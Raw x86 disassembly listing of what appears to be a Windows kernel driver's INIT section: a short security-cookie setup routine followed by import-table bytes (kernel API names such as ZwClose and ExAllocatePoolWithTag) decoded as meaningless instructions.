   1edeb:	and    BYTE PTR [ebx+0x6f],ah
   1edee:	ins    DWORD PTR es:[edi],dx
   1edef:	jo     0x1ee63
   1edf1:	gs jae 0x1ee67
   1edf4:	imul   ebp,DWORD PTR [edi+0x6e],0x74656d20
   1edfb:	.byte 0x68
   1edfc:	outs   dx,DWORD PTR ds:[esi]
   1edfd:	fs
	...

Disassembly of section INIT:

0007fa00 <INIT>:
   7fa00:	add    BYTE PTR [eax],al
   7fa02:	add    BYTE PTR [eax],al
   7fa04:	add    BYTE PTR [ecx+0x7eb38],ah
   7fa0a:	mov    ecx,0xbb40e64e
   7fa0f:	test   eax,eax
   7fa11:	je     0x7fa17
   7fa13:	cmp    eax,ecx
   7fa15:	jne    0x7fa31
   7fa17:	mov    eax,ds:0x1ee58
   7fa1c:	mov    eax,DWORD PTR [eax]
   7fa1e:	xor    eax,0x7eb38
   7fa23:	mov    ds:0x7eb38,eax
   7fa28:	jne    0x7fa31
   7fa2a:	mov    eax,ecx
   7fa2c:	mov    ds:0x7eb38,eax
   7fa31:	not    eax
   7fa33:	mov    ds:0x7eb3c,eax
   7fa38:	ret    
   7fa39:	inc    BYTE PTR [edi-0x7492c3ea]
   7fa3f:	call   DWORD PTR [ebp-0x75]
   7fa42:	in     al,dx
   7fa43:	call   0x7fa05
   7fa48:	pop    ebp
   7fa49:	jmp    0x191ca
   7fa4e:	int3   
   7fa4f:	int3   
   7fa50:	xchg   esp,eax
   7fa51:	cli    
   7fa52:	push   es
	...
   7fa5b:	add    BYTE PTR [eax+0x80006fc],ah
   7fa61:	out    dx,al
   7fa62:	add    BYTE PTR [eax],al
   7fa64:	mov    edx,?
   7fa66:	push   es
	...
   7fa6f:	add    dl,al
   7fa71:	cld    
   7fa72:	push   es
   7fa73:	add    BYTE PTR [eax],al
   7fa75:	out    dx,al
	...
   7fa8a:	add    BYTE PTR [eax],al
   7fa8c:	scas   al,BYTE PTR es:[edi]
   7fa8d:	cld    
   7fa8e:	push   es
   7fa8f:	add    BYTE PTR [eax],al
   7fa91:	add    BYTE PTR [eax],al
   7fa93:	add    BYTE PTR [esi],al
   7fa95:	sti    
   7fa96:	push   es
   7fa97:	add    BYTE PTR [eax],dl
   7fa99:	sti    
   7fa9a:	push   es
   7fa9b:	add    BYTE PTR [edx],bl
   7fa9d:	sti    
   7fa9e:	push   es
   7fa9f:	add    BYTE PTR [ebx+edi*8],ah
   7faa2:	push   es
   7faa3:	add    BYTE PTR [ebx+edi*8],dh
   7faa6:	push   es
   7faa7:	add    BYTE PTR [ebx+edi*8+0x6],dl
   7faab:	add    BYTE PTR [eax-0x5],ch
   7faae:	push   es
   7faaf:	add    BYTE PTR [edx-0x6bfff905],al
   7fab5:	sti    
   7fab6:	push   es
   7fab7:	add    BYTE PTR [ebx+edi*8-0x43bfffa],ch
   7fabe:	push   es
   7fabf:	add    dl,ch
   7fac1:	sti    
   7fac2:	push   es
   7fac3:	add    BYTE PTR [edx],al
   7fac5:	cld    
   7fac6:	push   es
   7fac7:	add    BYTE PTR [esp+edi*8],cl
   7faca:	push   es
   7facb:	add    BYTE PTR [esi],dl
   7facd:	cld    
   7face:	push   es
   7facf:	add    BYTE PTR [eax],dh
   7fad1:	cld    
   7fad2:	push   es
   7fad3:	add    BYTE PTR [esi-0x4],al
   7fad6:	push   es
   7fad7:	add    BYTE PTR [edx-0x4],dl
   7fada:	push   es
   7fadb:	add    BYTE PTR [esi-0x4],ah
   7fade:	push   es
   7fadf:	add    BYTE PTR [eax-0x4],dh
   7fae2:	push   es
   7fae3:	add    BYTE PTR [edx-0x6ffff904],al
   7fae9:	cld    
   7faea:	push   es
   7faeb:	add    ah,bh
   7faed:	cli    
   7faee:	push   es
   7faef:	add    dh,cl
   7faf1:	sti    
   7faf2:	push   es
   7faf3:	add    dl,cl
   7faf5:	cld    
   7faf6:	push   es
   7faf7:	add    BYTE PTR [eax],al
   7faf9:	add    BYTE PTR [eax],al
   7fafb:	add    BYTE PTR [ebx],cl
   7fafd:	add    eax,0x6c43775a
   7fb02:	outs   dx,DWORD PTR ds:[esi]
   7fb03:	jae    0x7fb6a
   7fb05:	add    BYTE PTR [ebx+0x5],bh
   7fb08:	pop    edi
   7fb09:	popa   
   7fb0a:	ins    BYTE PTR es:[edi],dx
   7fb0b:	ins    BYTE PTR es:[edi],dx
   7fb0c:	ins    DWORD PTR es:[edi],dx
   7fb0d:	jne    0x7fb7b
   7fb0f:	add    BYTE PTR [ecx+0x5],bh
   7fb12:	pop    edi
   7fb13:	popa   
   7fb14:	ins    BYTE PTR es:[edi],dx
   7fb15:	ins    BYTE PTR es:[edi],dx
   7fb16:	imul   esi,DWORD PTR fs:[esi+0x0],0x615f057d
   7fb1e:	ins    BYTE PTR es:[edi],dx
   7fb1f:	ins    BYTE PTR es:[edi],dx
   7fb20:	jb     0x7fb87
   7fb22:	ins    DWORD PTR es:[edi],dx
   7fb23:	add    BYTE PTR [ebp+0x0],dh
   7fb26:	inc    ebp
   7fb27:	js     0x7fb7b
   7fb29:	popa   
   7fb2a:	imul   esi,DWORD PTR [ebx+0x65],0x74617453
   7fb31:	jne    0x7fba6
   7fb33:	add    BYTE PTR [edx+0x0],al
   7fb36:	inc    ebp
   7fb37:	js     0x7fb7a
   7fb39:	ins    BYTE PTR es:[edi],dx
   7fb3a:	ins    BYTE PTR es:[edi],dx
   7fb3b:	outs   dx,DWORD PTR ds:[esi]
   7fb3c:	arpl   WORD PTR [ecx+0x74],sp
   7fb3f:	gs push eax
   7fb41:	outs   dx,DWORD PTR ds:[esi]
   7fb42:	outs   dx,DWORD PTR ds:[esi]
   7fb43:	ins    BYTE PTR es:[edi],dx
   7fb44:	push   edi
   7fb45:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0x72506761
   7fb4d:	imul   ebp,DWORD PTR [edi+0x72],0x797469
   7fb54:	dec    esi
   7fb55:	add    BYTE PTR [ebp+0x78],al
   7fb58:	inc    esi
   7fb59:	jb     0x7fbc0
   7fb5b:	gs push eax
   7fb5d:	outs   dx,DWORD PTR ds:[esi]
   7fb5e:	outs   dx,DWORD PTR ds:[esi]
   7fb5f:	ins    BYTE PTR es:[edi],dx
   7fb60:	push   edi
   7fb61:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0xbd006761
   7fb69:	add    edx,DWORD PTR [edx+0x74]
   7fb6c:	ins    BYTE PTR es:[edi],dx
   7fb6d:	inc    ebx
   7fb6e:	outs   dx,DWORD PTR ds:[esi]
   7fb6f:	ins    DWORD PTR es:[edi],dx
   7fb70:	jo     0x7fbd3
   7fb72:	jb     0x7fbd9
   7fb74:	push   ebp
   7fb75:	outs   dx,BYTE PTR ds:[esi]
   7fb76:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   7fb7d:	jb     0x7fbe8
   7fb7f:	outs   dx,BYTE PTR ds:[esi]
   7fb80:	add    BYTE PTR [bp+si+0x2],al
   7fb84:	dec    ebx
   7fb85:	gs push edx
   7fb87:	gs ins BYTE PTR es:[edi],dx
   7fb89:	gs popa 
   7fb8b:	jae    0x7fbf2
   7fb8d:	dec    ebp
   7fb8e:	jne    0x7fc04
   7fb90:	gs js  0x7fb93
   7fb93:	add    BYTE PTR [ebp+0x2],ch
   7fb96:	dec    ebx
   7fb97:	gs push edi
   7fb99:	popa   
   7fb9a:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
   7fba2:	ins    BYTE PTR es:[di],dx
   7fba4:	gs dec edi
   7fba6:	bound  ebp,QWORD PTR [edx+0x65]
   7fba9:	arpl   WORD PTR [eax+eax*1+0x41],si
   7fbad:	add    BYTE PTR [ebp+0x78],al
   7fbb0:	inc    ecx
   7fbb1:	ins    BYTE PTR es:[edi],dx
   7fbb2:	ins    BYTE PTR es:[edi],dx
   7fbb3:	outs   dx,DWORD PTR ds:[esi]
   7fbb4:	arpl   WORD PTR [ecx+0x74],sp
   7fbb7:	gs push eax
   7fbb9:	outs   dx,DWORD PTR ds:[esi]
   7fbba:	outs   dx,DWORD PTR ds:[esi]
   7fbbb:	ins    BYTE PTR es:[edi],dx
   7fbbc:	push   edi
   7fbbd:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0xa7006761
   7fbc5:	add    eax,0x636d656d
   7fbca:	jo     0x7fc45
   7fbcc:	add    BYTE PTR [eax],al
   7fbce:	mov    eax,ds:0x476d4d02
   7fbd3:	gs je  0x7fc29
   7fbd6:	jns    0x7fc4b
   7fbd8:	je     0x7fc3f
   7fbda:	ins    DWORD PTR es:[edi],dx
   7fbdb:	push   edx
   7fbdc:	outs   dx,DWORD PTR ds:[esi]
   7fbdd:	jne    0x7fc53
   7fbdf:	imul   ebp,DWORD PTR [esi+0x65],0x72646441
   7fbe6:	gs jae 0x7fc5c
   7fbe9:	add    bh,al
   7fbeb:	add    edx,DWORD PTR [edx+0x74]
   7fbee:	ins    BYTE PTR es:[edi],dx
   7fbef:	inc    ebx
   7fbf0:	outs   dx,DWORD PTR ds:[esi]
   7fbf1:	jo     0x7fc6c
   7fbf3:	push   ebp
   7fbf4:	outs   dx,BYTE PTR ds:[esi]
   7fbf5:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   7fbfc:	jb     0x7fc67
   7fbfe:	outs   dx,BYTE PTR ds:[esi]
   7fbff:	add    BYTE PTR [bx+si],al
   7fc02:	mov    DWORD PTR ds:0x6e736377,0x746163
   7fc0c:	test   eax,0x6d656d05
   7fc11:	jae    0x7fc78
   7fc13:	je     0x7fc15
   7fc15:	add    BYTE PTR [esi],al
   7fc17:	add    eax,0x6c41775a
   7fc1c:	ins    BYTE PTR es:[edi],dx
   7fc1d:	outs   dx,DWORD PTR ds:[esi]
   7fc1e:	arpl   WORD PTR [ecx+0x74],sp
   7fc21:	gs push esi
   7fc23:	imul   esi,DWORD PTR [edx+0x74],0x4d6c6175
   7fc2a:	gs ins DWORD PTR es:[edi],dx
   7fc2c:	outs   dx,DWORD PTR ds:[esi]
   7fc2d:	jb     0x7fca8
   7fc2f:	add    bl,ah
   7fc31:	add    DWORD PTR [ecx+0x6f],ecx
   7fc34:	inc    bx
   7fc36:	outs   dx,DWORD PTR ds:[esi]
   7fc37:	ins    DWORD PTR es:[edi],dx
   7fc38:	jo     0x7fca6
   7fc3a:	gs je  0x7fca2
   7fc3d:	push   edx
   7fc3e:	gs jno 0x7fcb6
   7fc41:	gs jae 0x7fcb8
   7fc44:	add    BYTE PTR [eax],al
   7fc46:	mov    ecx,0x70777305
   7fc4b:	jb     0x7fcb6
   7fc4d:	outs   dx,BYTE PTR ds:[esi]
   7fc4e:	je     0x7fcb6
   7fc50:	add    BYTE PTR [eax],al
   7fc52:	xor    eax,DWORD PTR [edx]
   7fc54:	dec    ebx
   7fc55:	gs push ecx
   7fc57:	jne    0x7fcbe
   7fc59:	jb     0x7fcd4
   7fc5b:	push   ebx
   7fc5c:	jns    0x7fcd1
   7fc5e:	je     0x7fcc5
   7fc60:	ins    DWORD PTR es:[edi],dx
   7fc61:	push   esp
   7fc62:	imul   ebp,DWORD PTR [ebp+0x65],0x7305ac00
   7fc69:	jo     0x7fcdd
   7fc6b:	imul   ebp,DWORD PTR [esi+0x74],0x5130066
   7fc72:	pop    edx
   7fc73:	ja     0x7fcb8
   7fc75:	jb     0x7fcdc
   7fc77:	popa   
   7fc78:	je     0x7fcdf
   7fc7a:	push   ebx
   7fc7b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
   7fc80:	outs   dx,BYTE PTR ds:[esi]
   7fc81:	add    BYTE PTR [esi+0x2],ah
   7fc84:	dec    ebx
   7fc85:	gs push esp
   7fc87:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
   7fc8e:	je     0x7fc90
   7fc90:	test   BYTE PTR [ecx],0x4b
   7fc93:	gs inc edx
   7fc95:	jne    0x7fcfe
   7fc97:	inc    ebx
   7fc98:	push   0x456b6365
   7fc9d:	js     0x7fc9f
   7fc9f:	add    BYTE PTR [esi+0x74],ch
   7fca2:	outs   dx,DWORD PTR ds:[esi]
   7fca3:	jae    0x7fd10
   7fca5:	jb     0x7fd15
   7fca7:	ins    BYTE PTR es:[edi],dx
   7fca8:	cs gs js 0x7fd11
   7fcac:	add    BYTE PTR [eax],al
   7fcae:	inc    eax
   7fcaf:	add    BYTE PTR [ebx+0x65],cl
   7fcb2:	inc    edi
   7fcb3:	gs je  0x7fcf9
   7fcb6:	jne    0x7fd2a
   7fcb8:	jb     0x7fd1f
   7fcba:	outs   dx,BYTE PTR ds:[esi]
   7fcbb:	je     0x7fd06
   7fcbd:	jb     0x7fd30
   7fcbf:	ins    BYTE PTR es:[edi],dx
   7fcc0:	add    BYTE PTR [eax],al
   7fcc2:	dec    eax
   7fcc3:	inc    ecx
   7fcc4:	dec    esp
   7fcc5:	cs fs ins BYTE PTR es:[edi],dx
   7fcc8:	ins    BYTE PTR es:[edi],dx
   7fcc9:	add    BYTE PTR [eax+0x6c745204],ah
   7fccf:	push   ebp
   7fcd0:	outs   dx,BYTE PTR ds:[esi]
   7fcd1:	ja     0x7fd3c
   7fcd3:	outs   dx,BYTE PTR ds:[esi]
   7fcd4:	fs
	...
